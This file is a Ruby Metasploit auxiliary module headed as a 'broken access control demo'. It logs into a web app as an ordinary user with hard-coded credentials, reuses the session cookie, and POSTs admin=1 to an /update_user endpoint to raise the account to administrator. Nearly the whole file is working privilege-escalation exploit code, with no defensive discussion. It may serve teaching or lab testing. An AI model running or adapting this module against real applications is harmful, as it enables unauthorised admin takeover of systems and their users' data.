##
# broken access control demo
##

class MetasploitModule < Msf::Auxiliary
  # Includes the HTTP client capabilities
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        "Name" => "Broken Access Control",
        "Description" => "Send POST request with admin update.",
        "Author" => ["Samuel"],
        "License" => MSF_LICENSE,
        "DisclosureDate" => "2026-08-21",
      )
    )

    # Register configuration options visible to the user in msfconsole
    register_options([
      OptString.new("LOGINURI", [true, "The login path", "/login"]),
      OptString.new("TARGETURI", [true, "The update user controller path", "/update_user"]),
    ])
  end

  def run
    # Access configured options using datastore
    login_path = datastore["LOGINURI"]
    target_path = datastore["TARGETURI"]

    print_status("Sending request to #{login_path}...")

    # Abstract structure for transmitting data
    begin
      res = send_request_cgi({
        "uri" => login_path,
        "method" => "POST",
        "vars_post" => {
          "username" => "user",
          "password" => "notadmin",
        },
      })

      if !(res && res.code == 200)
        print_error("Login failed")
        return
      else
        print_line("LOGIN: SUCCESS")
      end

      cookies = res.get_cookies
      if cookies.empty?
        print_error("No session cookie received")
        return
      end
      print_status("Sending request to #{target_path}...")

      res = send_request_cgi({
        "uri" => target_path,
        "method" => "POST",
        "cookie" => cookies,
        "vars_post" => {
          "username" => "user",
          "admin" => "1",
        },
      })

      if !(res && res.code == 200)
        print_error("Update failed")
        print_error(res.body)
        return
      end

      print_line(res.body)
      print_line("STATUS: SUCCESS")
    rescue ::Rex::ConnectionError => e
      print_error("Connection failed: #{e.message}")
    end
  end
end
